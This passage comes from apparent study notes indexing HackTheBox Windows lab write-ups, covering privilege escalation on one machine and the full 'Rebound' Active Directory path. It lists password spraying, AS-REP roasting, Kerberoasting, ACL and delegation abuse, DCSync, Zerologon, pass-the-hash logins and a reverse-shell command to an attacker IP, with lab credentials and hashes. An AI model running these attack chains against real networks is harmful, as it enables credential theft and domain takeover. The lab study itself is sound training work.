- `hashcat -a 0 -m 10800 hashes /usr/share/wordlists/rockyou.txt`
- `hashcat -a 0 -m 17500 hashes /usr/share/wordlists/rockyou.txt`
- `hashcat -a 0 -m 17900 hashes /usr/share/wordlists/rockyou.txt`
- `crackmapexec smb 10.10.10.179 -u usernames.txt -p password1`
- `crackmapexec winrm 10.10.10.179 -u usernames.txt -p password1`
- `crackmapexec winrm 10.10.10.179 -u andrew tushikikatomo svc-nas lana -p finance1`
- `evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1`
- `wget https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip`

### Artifacts and exact search anchors

`/usr/share/wordlists/rockyou.txt`, `setup.py`, `SUSER_SID`, `SUSER_SNAME`, `C:\inetpub folder. This user also seems to be unprivileged. Let`, `cefdebug.zip`, `c:\\windows\\temp\\test.exe`, `c:\\windows\\temp\\test.exe e cmd.exe 10.10.14.10 1234`, `C:\inetpub folder`, `MultimasterAPI.dll`, `smbserver.py`

Open the PDF around page **18** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- BloodHound shows sbauer GenericWrite over jorden; set jorden to not require pre-authentication (or set an SPN) and obtain/crack the resulting Kerberos material.
- Jorden belongs to Server Operators; modify a SYSTEM service binary path and restart the service for SYSTEM execution.
- Alternate reminders in the writeup include SeBackupPrivilege and Zerologon/CVE-2020-1472, but the service-control path is the primary escalation.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.
- With SeBackup, use backup semantics (for example DiskShadow/robocopy or BackupOperator tooling) to copy SAM/SYSTEM or NTDS/SYSTEM, then extract hashes offline.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → ACL abuse → group-membership abuse → AS-REP roasting → password cracking → WinRM → service abuse → WMI/PowerShell remoting → SeBackup abuse → CVE-2020-1472

- The Key Distribution Center (KDC) of the Domain Controller will check the authentication service request (AS-REQ), verify the user information and return an encrypted Ticket Granting Ticket (TGT).
- Now that the password for the primary domain administrator has been changed, we can use Impacket's psexec.py to gain a shell as SYSTEM.
- This privilege is disabled by UAC in a default installation, but when enabled, it allows the user to access ﬁles and directories that they don't own or have permission to access.
- The exploit will set the Computer Account password to an empty NT hash 31d6cfe0d16ae931b73c59d7e0c089c0 .
- can now perform a Pass The Hash attack using the obtained hashes to obtain a SYSTEM shell.

#### Commands and PDF search strings

- `sudo pip install bloodhound-python`
- `bloodhound-python -c ALL -u sbauer -p 'D3veL0pM3nT!' -d megacorp.local -ns`
- `bloodhound-python completes, compress the ﬁles into a zip and upload it.`
- `Get-ADUser -Filter 'Name -like "Jor*"' | Set-ADAccountControl`
- `GetNPUsers.py MEGACORP.local/jorden -request`
- `hashcat --help | grep Kerberos`
- `hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force`

### Artifacts and exact search anchors

`info.zip`, `/etc/hosts`, `GetNPUsers.py`, `/usr/share/wordlists/rockyou.txt`, `psexec.py`, `C:\users\administrator\desktop`, `CVE-2020-1472`, `secretsdump.py`

Open the PDF around page **25** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 71- Rebound

**Target:** Windows · Insane

[Detailed notes](./htb-writeups/Rebound.md) · [Official PDF](./htb-writeups/Rebound.pdf)

### Machine path overview

Rebound is an Insane Windows machine featuring a tricky Active Directory environment. User enumeration via RID cycling reveals an AS-REP-roastable user, whose TGT is used to Kerberoast another user with a crackable password. Weak ACLs are abused to obtain access to a group with FullControl over an OU, performing a Descendant Object Takeover (DOT), followed by a ShadowCredentials attack on a user with winrm access. On the target system, cross-session relay is leveraged to obtain the NetNTLMv2 hash of a logged-in user, which, once cracked, leads to a gMSA password read. Finally, the gMSA account allows delegation, but without protocol transition. Resource-Based Constrained Delegation (RBCD) is used to impersonate the Domain Controller, enabling a DCSync attack, leading to fully elevated privileges.

### Remote enumeration and foothold checks

- Correct the seven-hour clock skew before Kerberos work. SMB null login lists Shared even though it is empty.
- Because anonymous RPC works, run lookupsid through the high RID range (users appear near 7681-7687), not only the default first thousand RIDs.
- AS-REP roast the full user list; jjones's uncrackable AS-REP ticket is still useful for pre-authentication Kerberoasting.
- Use the Impacket fork supporting GetUserSPNs -no-preauth to request SPN tickets via jjones, then crack ldap_monitor's ticket.
- LDAP channel binding/signing disrupts ordinary binds: sync time and use Kerberos (-k); BloodHound may need ObjectProps excluded and LDAPS fallback.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
- After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- If an account/group can read a gMSA password, retrieve `msDS-ManagedPassword`, derive the NT hash, and authenticate as the managed service account.

### Post-foothold local enumeration and lateral movement

- ldap_monitor's password is reused by oorend; spray it, then add oorend to ServiceMgmt using the Self right.
- ServiceMgmt has GenericAll over the Service Users OU. Use dacledit with inheritance to propagate FullControl to child users winrm_svc and batch_runner; cleanup may require re-adding group membership.
- Use Shadow Credentials/certipy shadow auto on winrm_svc and WinRM with the recovered hash.
- Inspect sessions/processes: tbrady is interactively logged on in session 1.
- Run KrbRelay with NTLM cross-session mode, the correct session ID, and a Server 2019 CLSID via RunasCs to capture tbrady's NetNTLMv2 hash; crack it.
- tbrady can read delegator$'s gMSA password; retrieve msDS-ManagedPassword with bloodyAD.

### User path

**Memory chain:** WinRM → LDAP enumeration → subdomain enumeration → SMB enumeration → AS-REP roasting → Kerberoasting → Git history/config → password cracking → BloodHound path analysis → ACL abuse

- Given that we can log in anonymously, we try to enumerate users via Impacket's lookupsid.py , which uses brute force to find the security identifier (SID) of existing users.
- Kerberoasting without credentials Recent research has shown that an AS-REP-roastable user can be leveraged to perform Kerberoasting, without pre-authentication: However, for Kerberoasting, access to the session key is not required.
- Only the resulting ST—or more accurately, the encrypted part of the ST, which is not secured with the requesting accounts key—is required.
- INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.rebound.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled.
- Group Managed Service Accounts (GMSA) involve a setup in which Windows servers autonomously handle the password of an account by creating a complex, random password for it.

#### Commands and PDF search strings

- `nmap -p- --min-rate 1000 10.10.11.231`
- `Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds`
- `nmap -sCV -p 53,88,135,139,445,464,593,3268,3269,5985,9389 10.10.11.231`
- `Nmap done: 1 IP address (1 host up) scanned in 55.08 seconds`
- `smbclient -L \\\\10.10.11.231\\`
- `find the security identifier (SID) of existing users. It does so by cycling through the relative`
- `lookupsid.py nan@10.10.11.231 -no-pass`
- `lookupsid.py nan@10.10.11.231 10000 -no-pass`
- `lookupsid.py nan@10.10.11.231 10000 -no-pass | grep 'SidTypeUser' | sed 's/.*\\\`
- `GetNPUsers.py -usersfile usernames.txt rebound.htb/ -dc-ip 10.10.11.231`
- `GetUserSPNs.py -no-preauth jjones -request -usersfile ../usernames.txt`
- `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
- `bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc`
- `sudo ntpdate -s rebound.htb`
- `netexec smb dc01.rebound.htb -u usernames.txt -p '1GR8t@$$4u' --continue-onsuccess`
- `certipy shadow auto -u oorend@rebound.htb -p '1GR8t@$$4u' -account winrm_svc target dc01.rebound.htb -dc-ip 10.10.11.231 -k`
- `Certipy v4.8.2 - by Oliver Lyak (ly4k)`
- `evil-winrm -i dc01.rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512`
- `Evil-WinRM shell v3.3`
- `john tbrady --wordlist=/usr/share/wordlists/rockyou.txt`

### Artifacts and exact search anchors

`/etc/hosts`, `dc01.rebound.htb`, `rebound.htb`, `lookupsid.py`, `GetNPUsers.py`, `setup.py`, `GetUserSPNs.py`, `/usr/share/wordlists/rockyou.txt`, `bloodhound.py`, `20240328215209_bloodhound.zip`, `powerview.py`, `dacledit.py`, `dacledit-20240328-220635.bak`, `C:\Users\winrm_svc\Documents`, `C:\Users\winrm_svc\Desktop\user.txt`, `c:\users\winrm_svc\documents\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b5e49-4bdc-a8e6-1cb6c6877182 -port 10246`, `c:\users\winrm_svc\documents\KrbRelay.exe`, `msDS-ManagedPassword`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- findDelegation shows delegator$ has constrained delegation without protocol transition; classic getST impersonation fails because S4U2Self is not forwardable.
- Combine the controlled gMSA with RBCD/U2U so the S4U2Self ticket becomes usable for S4U2Proxy.
- Request a ticket impersonating the DC/computer account or another replication-capable principal for an appropriate service SPN, then use it for DCSync.
- Keep the ThePorgs Impacket fork and ccache/SPN names consistent because stock tooling lacks parts of the no-preauth/delegation flow used here.
- Before rbcd.py, put the short hostname first in /etc/hosts as '10.10.11.231 dc01 dc01.rebound.htb rebound.htb'; omitting this ordering makes rbcd.py fail with 'invalid server address.' Use ldap_monitor (which has an SPN) as delegate-from, delegator$ as delegate-to, and LDAPS.
- Administrator is NOT_DELEGATED, so the working RBCD/KCD bridge impersonates DC01$: first use ldap_monitor to obtain a forwardable browser/dc01.rebound.htb ticket for DC01$, then give that ccache to delegator$ via -additional-ticket to request http/dc01.rebound.htb before DCSync. A classic single getST call fails KDC_ERR_BADOPTION because constrained delegation lacks protocol transition.
- For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** delegation/RBCD → BloodHound path analysis → Kerberos ticket abuse → DCSync/secrets dump → WinRM

- In essence, the Service for User to Self (S4U2self) protocol enables a service to request a Service Ticket on another user's behalf, but for its own use.
- Conversely, the Service for User to Proxy (S4U2proxy) protocol allows a service to request a Service Ticket on another user's behalf, but for a different service.
- first request the ticket via the -self flag: getST.py rebound.htb/delegator\$ -hashes :e1630b0e18242439a50e9d8b5f5b7524 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator -self Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs [-] CCache file is not found.
- Finally, we feed the ticket to secretsdump.py , obtaining the Administrator's hash.
- use evil-winrm to get a shell as the administrator . evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8 Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami rebound\administrator The final flag can be found at C:\Users\Administrator\Desktop\root.txt .

#### Commands and PDF search strings

- `evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8`
- `Evil-WinRM shell v3.3`

### Artifacts and exact search anchors

`findDelegation.py`, `rebound.htb`, `dc01.rebound.htb`, `getST.py`, `describeTicket.py`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, `rbcd.py`, `/etc/hosts`, `browser_dc01.rebound.htb`, `http_dc01.rebound.htb`, `secretsdump.py`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **16** and search for `Privilege Escalation` plus the specific tools and artifacts above.

